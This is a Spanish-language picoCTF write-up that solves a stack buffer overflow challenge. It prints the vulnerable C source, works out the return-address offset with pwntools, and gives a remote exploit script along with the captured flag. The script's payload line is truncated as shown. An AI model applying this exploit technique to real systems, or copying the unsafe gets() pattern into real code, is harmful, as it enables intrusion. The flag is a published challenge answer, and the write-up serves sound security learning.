
# buffer overflow 1

## Descripcion
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 53607`

## Pistas
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.
## Solucion
Vemos que en este reto se nos da un programa junto con su codigo fuente:

```bash()
  GNU nano 6.4                                           vuln.c                                                     
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}



```
vemos que la funcion win() llama a la bandera para imprimirla con un gets(). El cual es vulnarable ya que gets() no se contiene y sigue leyendo mas alla del buffer por lo cual lo podemos desbordar. 

```bash()
┌──(kali㉿kali)-[~/notas-hacking/PicoCTf/binary/BufferOverflow1]
└─$ ./vuln
Please enter your string: 
asldjfkasdjfjkasldjfkjasjfkl;sjlk;fdjas
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

```
Al correr el programa se nos pide un string el cual podemos usar para sobrecargar la pila. Para calcular exactamente cuanto tenemos que usar las librerias de python llamadas pwntools. Vemos en el codigo fuente que el tamaño de bits de la bandera y del buffer no pasa los 64 bits, por lo cual para asegurar que si lo sobrecargemos usaremos la funcion in python y le daremos un tamaño de 100 bits al string: 

```bash()
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> 


```
Se nos da ese string y lo insertamos en el programa y nos da un error de segmentacion ya que llenamos el buffer tanto que nos dio el "return address":

```bash()
┌──(kali㉿kali)-[~/notas-hacking/PicoCTf/binary/BufferOverflow1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln

```
Ahora con la direccion que se nos proporciono al sobrescribrlo, usaremos cyclic_find in python para que nos regrese el numero exacto de caracteres para estar justo antes de la direccion de retorno:
```bash()
>>> cyclic_find(0x6161616c)
44

```
Si creamos 44 caracteres podemos sobrepasar el buffer y sobreescribir la direccion de retorno:
```bash()
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```

Tenemos que averiguar la direccion de retorno:
```bash()
┌──(kali㉿kali)-[~/notas-hacking/PicoCTf/binary/BufferOverflow1]
└─$ objdump -D vuln -M intel | grep 'win'          
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>

```
La direccion de retorno es 080491f6 pero ocupamos que este invertida, lo cual lo logramos con python:
```bash()
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'

```
Entonces ya tenemos todo, ya tenemos el numero exacto de caracteres, los cuales ya creamos, ya tenemos la direccion de retorno y ya la invertimos ahora usamos todo para poder hacer llamar la funcion win(), pero al hacerlo nos dice que no existe ninguna flag. esto es porque lo estamos haciendo de manera local y no remota. Al lanzar el programa de manera remota ya podemos sacar la bandera. Esto lo haremos con un  programa de python para automatizar todo:
```bash()
from pwn import *

p = remote('saturn.picoctf.net',49684)

overflow='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\>

print( p.recvuntil(':'))

p.sendline(overflow)

p.interactive()

```
ya con esto lanzamos el exploit y al lanzarlo nos da la bandera:

```bash()
                                                        
┌──(kali㉿kali)-[~/notas-hacking/PicoCTf/binary/BufferOverflow1]
└─$ python3 exp.py
[+] Opening connection to saturn.picoctf.net on port 49684: Done
/home/kali/notas-hacking/PicoCTf/binary/BufferOverflow1/exp.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print( p.recvuntil(':'))
b'Please enter your string:'
/home/kali/notas-hacking/PicoCTf/binary/BufferOverflow1/exp.py:9: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(overflow)
[*] Switching to interactive mode
 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}[*] Got EOF while reading in interactive
$  

```


## Bandera

picoCTF{addr3ss3s_ar3_3asy_9cf083f8}

## Notas adicionales

| comando | descripcion

## Referencias
